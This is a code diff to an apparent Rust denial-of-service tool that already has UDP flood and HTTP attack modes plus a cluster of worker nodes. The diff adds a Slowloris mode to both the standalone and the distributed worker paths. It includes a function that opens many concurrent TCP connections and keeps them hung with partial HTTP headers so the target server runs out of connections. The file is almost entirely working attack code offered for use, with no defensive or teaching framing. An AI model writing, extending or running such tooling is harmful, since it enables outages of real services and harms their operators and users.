@@ -5,6 +5,7 @@ mod stats;
 mod utils;
 mod cluster;
 mod udp;
+mod slowloris;
 
 use clap::Parser;
 use cli::Args;
@@ -66,14 +67,11 @@ async fn main() {
 async fn handle_standalone_attack(args: Args) {
     if args.attack_type == "udp" {
         // Handle UDP attack
-        let target_host = if let Some(host) = args.host {
-            host
+        let target_host = if let Some(ref host) = args.host {
+            host.clone()
         } else if let Some(ref url) = args.url {
             // Extract host from URL if provided
             url.replace("http://", "").replace("https://", "").split(':').next().unwrap_or(url).to_string()
-        } else if let Some(ref host) = args.host {
-            // Use provided host if available
-            host.clone()
         } else {
             utils::prompt_for_host()
         };
@@ -107,6 +105,46 @@ async fn handle_standalone_attack(args: Args) {
         match perform_udp_attack(target_host, target_port, duration, args.concurrent, args.delay, args.data) {
             Ok(()) => println!("{} UDP attack completed successfully", "INFO".blue()),
             Err(e) => eprintln!("{} UDP attack failed: {}", "ERROR".red(), e),
+        }
+    } else if args.attack_type == "slowloris" {
+        // Handle Slowloris attack
+        let target_host = if let Some(ref host) = args.host {
+            host.clone()
+        } else if let Some(ref url) = args.url {
+            // Extract host from URL if provided
+            url.replace("http://", "").replace("https://", "").split(':').next().unwrap_or(url).to_string()
+        } else {
+            utils::prompt_for_host()
+        };
+        
+        let target_port = if let Some(port) = args.target_port {
+            port
+        } else if let Some(ref url) = args.url {
+            // Extract port from URL if provided
+            let cleaned_url = url.replace("http://", "").replace("https://", "");
+            let parts: Vec<&str> = cleaned_url.split(':').collect();
+            if parts.len() > 1 {
+                parts[1].parse().unwrap_or(80) // Default to port 80 for HTTP
+            } else {
+                utils::prompt_for_port()
+            }
+        } else {
+            utils::prompt_for_port()
+        };
+        
+        let duration = if args.time != 0 {
+            args.time
+        } else {
+            utils::prompt_for_time()
+        };
+        
+        println!("\n{} Starting Slowloris attack on: {}:{}\n", 
+                 "INFO".blue(), target_host, target_port);
+        
+        // Perform Slowloris attack
+        match slowloris::perform_slowloris_attack(target_host, target_port, duration, args.concurrent, args.delay).await {
+            Ok(()) => println!("{} Slowloris attack completed successfully", "INFO".blue()),
+            Err(e) => eprintln!("{} Slowloris attack failed: {}", "ERROR".red(), e),
         }
     } else {
         // Handle HTTP attack (original functionality)
@@ -476,6 +514,55 @@ async fn run_worker_node(args: Args) {
                                 });
                                 tasks.push(task_handle);
                             }
+                        } else if task.attack_type == "slowloris" {
+                            // Slowloris attack implementation for worker
+                            let target_host = task.host.clone().unwrap_or_else(|| {
+                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
+                                cleaned_url.split(':').next().unwrap_or(&task.url).to_string()
+                            });
+                            let target_port = task.target_port.unwrap_or_else(|| {
+                                let cleaned_url = task.url.replace("http://", "").replace("https://", "");
+                                let parts: Vec<&str> = cleaned_url.split(':').collect();
+                                if parts.len() > 1 {
+                                    parts[1].parse().unwrap_or(80) // Default to port 80 for HTTP
+                                } else {
+                                    80
+                                }
+                            });
+                            
+                            for _ in 0..task.concurrent.unwrap_or(10) {
+                                let target_host_clone = target_host.clone();
+                                let target_port_clone = target_port;
+                                let sent_clone = requests_sent.clone();
+                                let success_clone = requests_success.clone();
+                                let error_clone = requests_error.clone();
+                                let attack_start_time_clone = attack_start_time.clone();
+                                let time_clone = task.time;
+                                let delay_clone = task.delay;
+                                
+                                let task_handle = tokio::spawn(async move {
+                                    loop {
+                                        if time_clone > 0 && attack_start_time_clone.elapsed().as_secs() >= time_clone {
+                                            break;
+                                        }
+                                        
+                                        match perform_slowloris_worker_attack(&target_host_clone, target_port_clone).await {
+                                            Ok(_) => {
+                                                success_clone.fetch_add(1, Ordering::SeqCst);
+                                            }
+                                            Err(_) => {
+                                                error_clone.fetch_add(1, Ordering::SeqCst);
+                                            }
+                                        }
+                                        sent_clone.fetch_add(1, Ordering::SeqCst);
+                                        
+                                        if delay_clone > 0 {
+                                            tokio::time::sleep(Duration::from_millis(delay_clone)).await;
+                                        }
+                                    }
+                                });
+                                tasks.push(task_handle);
+                            }
                         } else {
                             // HTTP attack implementation for worker (original)
                             for _ in 0..task.concurrent.unwrap_or(10) {
@@ -613,6 +700,31 @@ fn udp_attack_single_request(target_host: &str, target_port: u16, payload: &Opti
     let socket = UdpSocket::bind("0.0.0.0:0")?;
     socket.set_write_timeout(Some(std::time::Duration::from_millis(100)))?;
     socket.send_to(payload_bytes, &target_addr)?;
+    
+    Ok(())
+}
+
+async fn perform_slowloris_worker_attack(target_host: &str, target_port: u16) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
+    use tokio::net::TcpStream;
+    use tokio::io::AsyncWriteExt;
+    
+    let target_addr = format!("{}:{}", target_host, target_port);
+    let mut stream = TcpStream::connect(&target_addr).await?;
+    
+    // Send initial HTTP request headers slowly
+    let initial_request = format!(
+        "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n", 
+        target_host
+    );
+    
+    stream.write_all(initial_request.as_bytes()).await?;
+    
+    // Send a partial header to keep the connection alive
+    stream.write_all(b"X-a: ").await?;
+    stream.flush().await?;
+    
+    // Sleep to maintain the connection
+    tokio::time::sleep(std::time::Duration::from_secs(10)).await;
     
     Ok(())
 }
